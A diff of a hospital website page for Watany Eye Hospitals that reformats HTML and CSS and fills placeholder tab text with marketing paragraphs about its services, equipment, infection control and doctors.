@@ -29,7 +29,8 @@
         <link rel="stylesheet" href="../css/all.min.css">
 
         <!-- Icon 8 -->
-        <a  href="https://icons8.com/icon/wR5ngETkPDOl/aperture"></a><a href="https://icons8.com"></a>
+        <a href="https://icons8.com/icon/wR5ngETkPDOl/aperture"></a><a
+            href="https://icons8.com"></a>
 
         <!-- Magnific Popup css file -->
         <!-- <link rel="stylesheet" href="../vendor/Magnific-Popup-master/dist/jquery.magnific-popup.js"> -->
@@ -51,7 +52,8 @@
         <style>
             .hurg-header{
                 height: 550px;
-                clip-path: polygon(100% 0, 100% 72%, 50% 100%, 0 72%, 0 0);      
+                clip-path: polygon(100% 0, 100% 72%, 50% 100%, 0 72%, 0 0); 
+                position: relative; 
             }
             .hurg-header .overlay-img{
                 background: url("../images/hurg-bg.jpg") no-repeat;
@@ -62,9 +64,10 @@
                 background-color: rgba(0, 0, 0, 0.342);
                 background-blend-mode: overlay;
                 z-index: -1;
+            }
+            .hurg-header .header-text{
                 position: absolute;
-                top: 0;
-                left: 0;
+                top: 45%;
             }
             .medical-tour .medical-header .reason-b-h span{
                 font-size: 30px;
@@ -72,7 +75,7 @@
             .hurg-header h1{
                 color: white;
                 font-weight: 600;
-                font-size: 55px;
+                font-size: 3em;
             }
             .hurg-header .container{
                 display: flex;
@@ -261,29 +264,36 @@
                 background-color: #f2f4f5;
             }
             .our-goals .goal-btn{
-                font-size: 25px;
-                line-height: 30px;
+                font-size: 20px;
+                line-height: 20px;
                 font-weight: 600;
-                background-color: transparent;
             }
             .our-goals ul li span{
                 padding: 20px 0;
                 font-size: 30px;
             }
-            .our-goals ul li{
+            .our-goals ul {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin: 0;
+                padding: 0;
+                flex-wrap: wrap;
+            }
+            .our-goals ul li h4{
                 margin-bottom: 25px !important;
                 position: relative;
                 display: inline-block;
-                width: 210px;
-                height: 200px;
+                width: 175px;
+                height: 170px;
                 background: #ebeced;
                 border-radius: 30px;
-                padding: 36px 20px 32px 20px;
+                padding: 20px;
                 cursor: pointer;
                 margin: 0px 3.5px;
                 z-index: 1;
             }
-            .our-goals ul li::before{
+            .our-goals ul li h4::before , .our-goals ul li.active::before{
                 position: absolute;
                 content: '';
                 width: 100%;
@@ -294,14 +304,14 @@
                 z-index: -1;
                 background-color: #213262;
             }
-            /* .our-goals ul li h4 {
-                position: relative;
-            } */
-            .our-goals ul li h4 , .our-goals ul li::before{
-                transition: all 500ms ease;
-
+            .our-goals ul li h4.active::before{
+                height: 100% !important;
             }
-            .our-goals ul li h4::after{
+
+            .our-goals ul li h4{
+                transition: all 400ms ease;
+            }
+            .our-goals ul li h4::after , .our-goals ul li h4.active::after{
                 content: '';
                 position: absolute;
                 width: 25px;
@@ -312,26 +322,23 @@
                 left: 44%;
                 z-index: -1;
                 opacity: 0;
-                transition: all 500ms ease;
-                transition-delay: 400ms ;
+                transition: all 400ms ease;
+                transition-delay: 200ms ;
             }
-            .our-goals ul li:hover::before{
+            .our-goals ul li h4:hover::before{
                 height: 100%;
             }
-            .our-goals ul li:hover h4::after{
+            .our-goals ul li h4:hover::after , .our-goals ul li h4.active::after{
                 opacity: 1;
                 bottom: -8px;
             }
-            .our-goals ul li:hover h4{
+            .our-goals ul li h4:hover  , .our-goals ul li h4.active{
                 color: white;
             }
-            .our-goals ul {
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                margin: 0;
-                padding: 0;
-                flex-wrap: wrap;
+            .goal-parent{
+                background-color: white;
+                padding: 20px;
+                border-radius: 20px;
             }
             .hurg-gal .splide__slide{
                 border-radius: 20px;
@@ -373,14 +380,7 @@
                 height: 350px;
             }
             }
-            /* @media screen and (max-width:480px) {
-                .hurg-visits .splide__arrow--prev , .hurg-visits .splide__arrow--next{
-                    top: 45%;
-                }
-                .hurg-visits .splide__arrow--prev{
-                    left: 0;
-                }
-            } */
+
     </style>
 
     </head>
@@ -398,7 +398,8 @@
             <span class="d-inline-block" tabindex="0" data-bs-toggle="popover"
                 data-bs-trigger="hover focus"
                 data-bs-content="Book Now">
-                <a class="btn" href="./bookingform.html" type="button" disabled><i
+                <a class="btn" href="./bookingform.html" type="button"
+                    disabled><i
                         class="fa-regular fa-calendar-plus"></i></a>
             </span>
         </section>
@@ -472,7 +473,8 @@
                             <img src="../images/logo-trans2.png"
                                 alt="watany-eye-hospitals">
                             <i type="button" class="fa-solid fa-xmark white"
-                                data-bs-dismiss="offcanvas" aria-label="Close"></i>
+                                data-bs-dismiss="offcanvas"
+                                aria-label="Close"></i>
                         </div>
                         <div class="offcanvas-body">
                             <ul
@@ -583,7 +585,8 @@
 
                                         <li>
                                             <a class="nav-link"
-                                                href="./wrdc.html">About WRDS</a>
+                                                href="./wrdc.html">About
+                                                WRDS</a>
                                         </li>
                                         <li style="border-bottom: none;">
                                             <a class="nav-link"
@@ -607,7 +610,8 @@
 
                                         <li class="dropstart sub-drop">
                                             <a class="dropdown-item"
-                                                href="./wrdc.html">About WRDC</a>
+                                                href="./wrdc.html">About
+                                                WRDC</a>
                                             <!-- <a class="active" data-bs-toggle="dropdown" href="../clinics.html">Clinics</a> -->
                                         </li>
 
@@ -637,7 +641,7 @@
                 </div>
             </nav>
 
-            <section class="hurg-header"> 
+            <section class="hurg-header">
                 <div class="overlay-img"></div>
                 <div class="container justify-content-center">
                     <div class="header-text text-center">
@@ -698,34 +702,32 @@
                     </div>
                 </div>
 
-       
-
             </div>
 
             <div class="modal fade" id="staticBackdrop"
-            data-bs-backdrop="static"
-            data-bs-keyboard="false" tabindex="-1"
-            aria-labelledby="staticBackdropLabel" aria-hidden="true">
-            <div class="modal-dialog modal-dialog-centered">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h1 class="modal-title fs-5"
-                            id="staticBackdropLabel">Why Choose
-                            Watany Eye Hospitals</h1>
-                        <button type="button" class="btn-close"
-                            data-bs-dismiss="modal"
-                            aria-label="Close"></button>
-                    </div>
-                    <div class="modal-body">
-                        <iframe width="100%" height="350"
-                            src="https://www.youtube.com/embed/E2hzyI2xEms?si=usikVjBgk1yhNxBH"
-                            title="YouTube video player" frameborder="0"
-                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-                            allowfullscreen></iframe>
-                    </div>
+                data-bs-backdrop="static"
+                data-bs-keyboard="false" tabindex="-1"
+                aria-labelledby="staticBackdropLabel" aria-hidden="true">
+                <div class="modal-dialog modal-dialog-centered">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h1 class="modal-title fs-5"
+                                id="staticBackdropLabel">Why Choose
+                                Watany Eye Hospitals</h1>
+                            <button type="button" class="btn-close"
+                                data-bs-dismiss="modal"
+                                aria-label="Close"></button>
+                        </div>
+                        <div class="modal-body">
+                            <iframe width="100%" height="350"
+                                src="https://www.youtube.com/embed/E2hzyI2xEms?si=usikVjBgk1yhNxBH"
+                                title="YouTube video player" frameborder="0"
+                                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+                                allowfullscreen></iframe>
+                        </div>
 
+                    </div>
                 </div>
-            </div>
             </div>
 
             <section class="hurg-info py-3">
@@ -780,61 +782,133 @@
                     </div>
 
                     <div class="button-goals text-center">
-                        <ul>
-                            <li>
-                                <h4 id="button1" class="goal-btn">
-                                    <span class="d-block"><i class="fa-solid fa-layer-group"></i></span> 
-                                    All Services <br> in one place
-                                </h4> 
-                            </li>
-                            <li>
-                                <h4 id="button2"  class="goal-btn">
-                                    <span class="d-block"><i class="fa-solid fa-lightbulb"></i></span>
-                                    Latest <br> technology
-                                </h4>
-                            </li>
-                            <li>
-                                <h4 id="button3"  class="goal-btn">
-                                    <span class="d-block"><i class="fa-solid fa-gears"></i></span>
-                                    Infection <br> Control
-                                </h4>
-                            </li>
-                            <li>
-                                <h4 id="button4"  class="goal-btn">
-                                    <span class="d-block"><i class="fa-solid fa-user-nurse"></i></span>
-                                    Our <br> Doctors
-                                </h4>
-                            </li>
-                            <li>
-                                <h4 id="button5"  class="goal-btn">
-                                    <span class="d-block"><i class="fa-solid fa-certificate"></i></span>
-                                    23 Years  <br> of Experience
-                                </h4>
-                            </li>
-                        </ul>
-                        
+                        <div class="contain-services" id="contain-header">
+                            <ul>
+                                <li>
+                                    <h4 id="button1" class="goal-btn active">
+                                        <span class="d-block"><i
+                                                class="fa-solid fa-layer-group"></i></span>
+                                        All Services <br> in one place
+                                    </h4>
+                                </li>
+                                <li>
+                                    <h4 id="button2" class="goal-btn">
+                                        <span class="d-block"><i
+                                                class="fa-solid fa-lightbulb"></i></span>
+                                        Latest <br> technology
+                                    </h4>
+                                </li>
+                                <li>
+                                    <h4 id="button3" class="goal-btn">
+                                        <span class="d-block"><i
+                                                class="fa-solid fa-gears"></i></span>
+                                        Infection <br> Control
+                                    </h4>
+                                </li>
+                                <li>
+                                    <h4 id="button4" class="goal-btn">
+                                        <span class="d-block"><i
+                                                class="fa-solid fa-user-nurse"></i></span>
+                                        Our <br> Doctors
+                                    </h4>
+                                </li>
+                                <li>
+                                    <h4 id="button5" class="goal-btn">
+                                        <span class="d-block"><i
+                                                class="fa-solid fa-certificate"></i></span>
+                                        23 Years <br> of Experience
+                                    </h4>
+                                </li>
+                            </ul>
+                        </div>
 
-                        <div class="goal-parent py-5">
+                        <div class="goal-parent py-5 text-start">
                             <div class="goal-text first-goal" id="goal-1">
-                                <h1>Test1</h1>
+                                <p>At Watany Eye Hospitals, all your eye medical
+                                    needs are met under one roof to ensure that
+                                    you receive the highest quality care in a
+                                    seamless and efficient manner. From routine
+                                    check-ups to specialized treatments, our
+                                    investigations department utilizes
+                                    cutting-edge technology to provide accurate
+                                    diagnostics, while our specialized clinics
+                                    cater to a variety of medical needs, from
+                                    primary care to specialized treatments. With
+                                    our expert surgeons and advanced operating
+                                    rooms, we perform a wide range of operations
+                                    with precision and care. Additionally, our
+                                    contact lens center offers personalized
+                                    solutions for vision correction, while our
+                                    fully equipped laboratory provides timely
+                                    and accurate test results. Need glasses or
+                                    contact lenses? Visit our optics department
+                                    for a wide selection of frames and lenses to
+                                    suit your style and prescription. And to
+                                    ensure you have access to the medications
+                                    you need, our pharmacy is stocked with a
+                                    comprehensive selection of prescription and
+                                    over-the-counter drugs.</p>
                             </div>
                             <div class="goal-text" id="goal-2">
-                                <h1>Test2</h1>
+                                <p>Our Hospital is equipped with the latest
+                                    medical equipment to ensure precise
+                                    diagnoses and effective treatments for a
+                                    wide range of eye conditions. From advanced
+                                    imaging systems for detailed assessments to
+                                    cutting-edge laser technology for refractive
+                                    surgeries, we offer our patients access to
+                                    the most innovative tools available. Our
+                                    experienced ophthalmologists leverage these
+                                    technologies to provide personalized care,
+                                    whether you're seeking routine eye exams,
+                                    cataract surgery, or complex retinal
+                                    procedures. We are certified with a badge
+                                    from the Center of Excellence for the most
+                                    advanced equipment we have.</p>
                             </div>
                             <div class="goal-text" id="goal-3">
-                                <h1>Test3</h1>
+                                <p>We understand the critical need to maintain a
+                                    safe and sterile environment to safeguard
+                                    the health and well-being of our patients.
+                                    From meticulously sanitized examination
+                                    rooms to the thorough sterilization of
+                                    surgical equipment, we leave no stone
+                                    unturned in ensuring a clean and hygienic
+                                    environment.</p>
                             </div>
                             <div class="goal-text" id="goal-4">
-                                <h1>Test4</h1>
+                                <p>Our team of ophthalmologists exemplifies the
+                                    pinnacle of professionalism, expertise, and
+                                    empathy in the field of ophthalmology. From
+                                    routine eye examinations to complex surgical
+                                    procedures, our eye doctors approach each
+                                    case with meticulous attention to detail,
+                                    ensuring the highest standards of precision
+                                    and safety. Moreover, our commitment to
+                                    staying abreast of the latest advancements
+                                    in ophthalmic technology and techniques
+                                    underscores our dedication to delivering
+                                    cutting-edge treatments with compassion and
+                                    integrity. You are in the hands of true
+                                    professionals who prioritize your visual
+                                    health and well-being above all else.</p>
                             </div>
                             <div class="goal-text" id="goal-5">
-                                <h1>Test5</h1>
+                                <p>Our journey of 23 years is a testament to our
+                                    enduring passion for preserving and
+                                    enhancing vision, as well as our steadfast
+                                    commitment to the well-being of our
+                                    patients. As we embark on the next chapter
+                                    of our mission, we remain dedicated to
+                                    providing comprehensive eye care services of
+                                    the highest quality, ensuring that every
+                                    patient receives the personalized attention
+                                    and exceptional treatment they deserve.</p>
                             </div>
                         </div>
 
                     </div>
 
-    
                 </div>
             </section>
 
@@ -844,21 +918,27 @@
                         <div class="row">
                             <div class="col-lg-7 col-md-12">
                                 <div class="text-left">
-                                    <h2>Are You Looking For Eye Care Service?</h2>
+                                    <h2>Are You Looking For Eye Care
+                                        Service?</h2>
                                 </div>
                             </div>
-                            <div class="col-lg-5 col-md-12 d-flex justify-content-center text-right">
+                            <div
+                                class="col-lg-5 col-md-12 d-flex justify-content-center text-right">
                                 <div class="text-center">
-                                   <ul>
-                                    <li><a href="#" class="booking bold">Book Appointment</a></li>
-                                    <li>
-                                        <h3 class="mb-0">
-                                            <a href="#" class="hotline bold">16112
-                                            </a>
-                                        </h3>
-                                    <span class="bold main-font">HotLine</span>
-                                    </li>
-                                   </ul>
+                                    <ul>
+                                        <li><a href="#"
+                                                class="booking bold">Book
+                                                Appointment</a></li>
+                                        <li>
+                                            <h3 class="mb-0">
+                                                <a href="#"
+                                                    class="hotline bold">16112
+                                                </a>
+                                            </h3>
+                                            <span
+                                                class="bold main-font">HotLine</span>
+                                        </li>
+                                    </ul>
                                 </div>
                             </div>
                         </div>
@@ -872,122 +952,149 @@
                         <h1 class="bold">Explore by <br> category</h1>
                     </div>
                     <div class="splide" id="hurg-serv"
-            aria-label="Splide Basic HTML Example">
-            <div class="splide__track">
-              <ul class="splide__list">
+                        aria-label="Splide Basic HTML Example">
+                        <div class="splide__track">
+                            <ul class="splide__list">
 
-                <li class="splide__slide">
+                                <li class="splide__slide">
 
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="../images/icons/doctor-black.png" alt="our-doctors">
-                            </div>
-                            <div class="box-body">
-                                <h2>Doctors</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="../images/icons/doctor-black.png"
+                                                    alt="our-doctors">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Doctors</h2>
+                                                <p>Lorem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+
+                                </li>
+
+                                <li class="splide__slide">
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="../images/icons/clinic-black.png"
+                                                    alt="our-clinics">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Clinics</h2>
+                                                <p>Lorem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li class="splide__slide">
+
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="../images/icons/lab-black.png"
+                                                    alt="our-laboratory">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Laboratory</h2>
+                                                <p>Loem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+
+                                </li>
+
+                                <li class="splide__slide">
+
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="../images/icons/glasses-black.png"
+                                                    alt="optics">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Optics</h2>
+                                                <p>Lorem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+
+                                </li>
+
+                                <li class="splide__slide">
+
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="../images/icons/optometry-black.png"
+                                                    alt="investigations">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Investigations</h2>
+                                                <p>Lorem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+
+                                </li>
+
+                                <li class="splide__slide">
+
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="../images/icons/operations-black.png"
+                                                    alt="operations">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Operations</h2>
+                                                <p>Lorem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+
+                                </li>
+
+                                <li class="splide__slide">
+
+                                    <a href="#" class="box-link">
+                                        <div class="box">
+                                            <div class="box-icon">
+                                                <img
+                                                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADzklEQVR4nO1ZTU8UQRB9ibhg1APgLxBMjAquxPUCGvgPhDte4DQ/QeWqIF40cFPvyIch3EVjOIgEEfAnoIARL8KaXVPJm6QymempnpkFD7xkEtjprn5vprqqugY4xSn+CzQDGAAwBmAWwCaAfQBHAA7591fekzH9nHPi6AEwDeAngLrnJXOmANw6CeJlAEsRQqsAxgEMAugG0ArgLK9W/ib3JgB8VvNqABZ5v+E4B2ASwF8ufgDgMYCrGWzJnCe0IbaqFNeCBuEKgDUudsSnLU82L9oAPKWAOt9OJwrGHQA/uIBs0Jvqniz2AcCwh70VAB9j3HKLa3wHUCmS/G8alihyPnK/j34s14jRZuj/UVwAMKfcs1KE24RP/iWAMwnjAk8RSQIETQBeqTfRgRwbdk09+STyWUS4BIQi5lV0y7SxJ5XPR90mr4g0AaE7bXOcBAwvlBkVqpENW5QIiwAwyYU8uuCBpazKjSKsArQnvIVHeSATfuWM8y4RPgLaGJFq9IxUTNO4ZMm8SBJhEdCrItA4x79IW7BZFWZhebCcoVCLu0TEqFFAwPGS8ATXOH4PQMklYECFLhQsQItwCQjUW7uvfl/nnHsuAWM5Nu+oWjhIIZYkIFBjwrcV3cwPXSTCND5YMPkowTgBgYO8YIhz3riIbHJQVwby9RTymmhUQJBCHsxHMmfDZXyXgyR0WTCS4hJJ0OMDA3nBJc6R2iwRhxxU8iCfR0BgJB9GSJnzpwgBmnyQQ0DNSN4sIHShdg/yyClg1DjH5EJpmziOvCbks4l9yJs38awjjCaR1wKsYdSXvA6jM8iQyFzk43w6KJi8TmQP4EC/6gyEGDYkqVCAzglFXMtqjS/87W7aTt+PFHMrBtfQm7hIEe9o8zr/32WjzImpSDndwdLWhWgUspYWVkxYy+nwGFfjIcKakePCaFEi2tnWqfkcbxdJSDpmFiTlgSJEPKPtBZ9J3eowbTnGuRJZHhE95CCtzBtZ/W6LLQ4X0jJxFhEXAXyjXWkge6NFtcHn2GxKgqWU8BHRRJcRm5/yfAzpZHuvznZfkghrLWQR0QTgNe3tALiMnKioHv58gjv5FHNaRG+M24RPXta8jYJQUW9iO+az0LJKOhZIdn8fadz2KJ/fKZK8dqdVLlBlbeIqu61oZ6isKp/P7TaujT2uFjvg/9K38YWUBxPq28MRo82xfL3sYq9S1zzrfCtDzB1tPNmV+JTLvDepCrM6bSxQ0LGjzPpkL0OhJoXZ8wzd74agxDL3EQ8cGyR4yGuXT32Gjak+S1V5ilOg8fgHDAAFsKPpxnUAAAAASUVORK5CYII=">
+                                            </div>
+                                            <div class="box-body">
+                                                <h2>Lens</h2>
+                                                <p>Lorem ipsum dolor sit amet
+                                                    consectetur adipisicing
+                                                    elit. Asperiores, hic!</p>
+                                            </div>
+                                        </div>
+                                    </a>
+
+                                </li>
+
+                            </ul>
                         </div>
-                    </a>
-
-                </li>
-
-                <li class="splide__slide">
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="../images/icons/clinic-black.png" alt="our-clinics">
-                            </div>
-                            <div class="box-body">
-                                <h2>Clinics</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
-                        </div>
-                    </a>
-                </li>
-
-                <li class="splide__slide">
-
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="../images/icons/lab-black.png" alt="our-laboratory">
-                            </div>
-                            <div class="box-body">
-                                <h2>Laboratory</h2>
-                                <p>Loem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
-                        </div>
-                    </a>
-
-                </li>
-
-                <li class="splide__slide">
-
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="../images/icons/glasses-black.png" alt="optics">
-                            </div>
-                            <div class="box-body">
-                                <h2>Optics</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
-                        </div>
-                    </a>
-
-                </li>
-
-                <li class="splide__slide">
-
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="../images/icons/optometry-black.png" alt="investigations">
-                            </div>
-                            <div class="box-body">
-                                <h2>Investigations</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
-                        </div>
-                    </a>
-
-                </li>
-
-                <li class="splide__slide">
-
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                               <img src="../images/icons/operations-black.png" alt="operations">
-                            </div>
-                            <div class="box-body">
-                                <h2>Operations</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
-                        </div>
-                    </a>
-
-                </li>
-
-                <li class="splide__slide">
-
-                    <a href="#" class="box-link">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADzklEQVR4nO1ZTU8UQRB9ibhg1APgLxBMjAquxPUCGvgPhDte4DQ/QeWqIF40cFPvyIch3EVjOIgEEfAnoIARL8KaXVPJm6QymempnpkFD7xkEtjprn5vprqqugY4xSn+CzQDGAAwBmAWwCaAfQBHAA7591fekzH9nHPi6AEwDeAngLrnJXOmANw6CeJlAEsRQqsAxgEMAugG0ArgLK9W/ib3JgB8VvNqABZ5v+E4B2ASwF8ufgDgMYCrGWzJnCe0IbaqFNeCBuEKgDUudsSnLU82L9oAPKWAOt9OJwrGHQA/uIBs0Jvqniz2AcCwh70VAB9j3HKLa3wHUCmS/G8alihyPnK/j34s14jRZuj/UVwAMKfcs1KE24RP/iWAMwnjAk8RSQIETQBeqTfRgRwbdk09+STyWUS4BIQi5lV0y7SxJ5XPR90mr4g0AaE7bXOcBAwvlBkVqpENW5QIiwAwyYU8uuCBpazKjSKsArQnvIVHeSATfuWM8y4RPgLaGJFq9IxUTNO4ZMm8SBJhEdCrItA4x79IW7BZFWZhebCcoVCLu0TEqFFAwPGS8ATXOH4PQMklYECFLhQsQItwCQjUW7uvfl/nnHsuAWM5Nu+oWjhIIZYkIFBjwrcV3cwPXSTCND5YMPkowTgBgYO8YIhz3riIbHJQVwby9RTymmhUQJBCHsxHMmfDZXyXgyR0WTCS4hJJ0OMDA3nBJc6R2iwRhxxU8iCfR0BgJB9GSJnzpwgBmnyQQ0DNSN4sIHShdg/yyClg1DjH5EJpmziOvCbks4l9yJs38awjjCaR1wKsYdSXvA6jM8iQyFzk43w6KJi8TmQP4EC/6gyEGDYkqVCAzglFXMtqjS/87W7aTt+PFHMrBtfQm7hIEe9o8zr/32WjzImpSDndwdLWhWgUspYWVkxYy+nwGFfjIcKakePCaFEi2tnWqfkcbxdJSDpmFiTlgSJEPKPtBZ9J3eowbTnGuRJZHhE95CCtzBtZ/W6LLQ4X0jJxFhEXAXyjXWkge6NFtcHn2GxKgqWU8BHRRJcRm5/yfAzpZHuvznZfkghrLWQR0QTgNe3tALiMnKioHv58gjv5FHNaRG+M24RPXta8jYJQUW9iO+az0LJKOhZIdn8fadz2KJ/fKZK8dqdVLlBlbeIqu61oZ6isKp/P7TaujT2uFjvg/9K38YWUBxPq28MRo82xfL3sYq9S1zzrfCtDzB1tPNmV+JTLvDepCrM6bSxQ0LGjzPpkL0OhJoXZ8wzd74agxDL3EQ8cGyR4yGuXT32Gjak+S1V5ilOg8fgHDAAFsKPpxnUAAAAASUVORK5CYII=">
-                            </div>
-                            <div class="box-body">
-                                <h2>Lens</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores, hic!</p>
-                            </div>
-                        </div>
-                    </a>
-
-                </li>
-
-              </ul>
-            </div>
                     </div>
                 </div>
             </section>
@@ -1110,7 +1217,6 @@
                 </div>
             </section>
 
-
             <section class="hurg-visits pb-5 pt-4">
                 <div class="container">
                     <div class="visits-header mb-5">
@@ -1120,90 +1226,118 @@
                         <h1 class="bold main-font">From 1 to 7 March</h1>
                     </div>
                     <div class="splide" id="hurg-visits"
-                    aria-label="Splide Basic HTML Example">
-                    <div class="splide__track">
-                      <ul class="splide__list">
-        
-                        <li class="splide__slide">
-        
-                                <div class="box">
-                                    <div class="box-icon">
-                                        <img src="../images/doctors/Ahmed Kamel.png" alt="our-doctors">
-                                    </div>
-                                    <div class="box-body p-3">
-                                        <h2>Dr Ahmed Kamel</h2>
-                                        <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                        <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                        <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                        <h3 style="font-size: 20px; font-weight: bold;" >23/5/2024</h3>
-                                    </div>
-                                </div>
+                        aria-label="Splide Basic HTML Example">
+                        <div class="splide__track">
+                            <ul class="splide__list">
 
-                        </li>
-        
-                        <li class="splide__slide">
-                                <div class="box">
-                                    <div class="box-icon">
-                                        <img src="../images/doctors/Ahmed Assaf.png" alt="our-clinics">
-                                    </div>
-                                    <div class="box-body p-3">
-                                        <h2>Dr Ahmed Assaf</h2>
-                                        <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                        <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                        <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                        <h3 style="font-size: 20px; font-weight: bold;" >23/5/2024</h3>
-                                    </div>
-                                </div>
-                        </li>
-        
-                        <li class="splide__slide">
-                            <div class="box">
-                                <div class="box-icon">
-                                    <img src="../images/doctors/Fathy Fawzy.png" alt="our-clinics">
-                                </div>
-                                <div class="box-body p-3">
-                                    <h2>Dr Fathy Fawzy</h2>
-                                    <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                    <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                    <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                    <h3 style="font-size: 20px; font-weight: bold;" >23/5/2024</h3>
-                                </div>
-                            </div>
-                    </li>
+                                <li class="splide__slide">
 
-                    <li class="splide__slide">
-                        <div class="box">
-                            <div class="box-icon">
-                                <img src="../images/doctors/Aldemerdash Omar.png" alt="our-clinics">
-                            </div>
-                            <div class="box-body p-3">
-                                <h2>Dr Aldemerdash Omar</h2>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                <p>Lorem ipsum dolor sit amet consectetur adipisicing</p>
-                                <h3 style="font-size: 20px; font-weight: bold;" >23/5/2024</h3>
-                            </div>
+                                    <div class="box">
+                                        <div class="box-icon">
+                                            <img
+                                                src="../images/doctors/Ahmed Kamel.png"
+                                                alt="our-doctors">
+                                        </div>
+                                        <div class="box-body p-3">
+                                            <h2>Dr Ahmed Kamel</h2>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <h3
+                                                style="font-size: 20px; font-weight: bold;">23/5/2024</h3>
+                                        </div>
+                                    </div>
+
+                                </li>
+
+                                <li class="splide__slide">
+                                    <div class="box">
+                                        <div class="box-icon">
+                                            <img
+                                                src="../images/doctors/Ahmed Assaf.png"
+                                                alt="our-clinics">
+                                        </div>
+                                        <div class="box-body p-3">
+                                            <h2>Dr Ahmed Assaf</h2>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <h3
+                                                style="font-size: 20px; font-weight: bold;">23/5/2024</h3>
+                                        </div>
+                                    </div>
+                                </li>
+
+                                <li class="splide__slide">
+                                    <div class="box">
+                                        <div class="box-icon">
+                                            <img
+                                                src="../images/doctors/Fathy Fawzy.png"
+                                                alt="our-clinics">
+                                        </div>
+                                        <div class="box-body p-3">
+                                            <h2>Dr Fathy Fawzy</h2>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <h3
+                                                style="font-size: 20px; font-weight: bold;">23/5/2024</h3>
+                                        </div>
+                                    </div>
+                                </li>
+
+                                <li class="splide__slide">
+                                    <div class="box">
+                                        <div class="box-icon">
+                                            <img
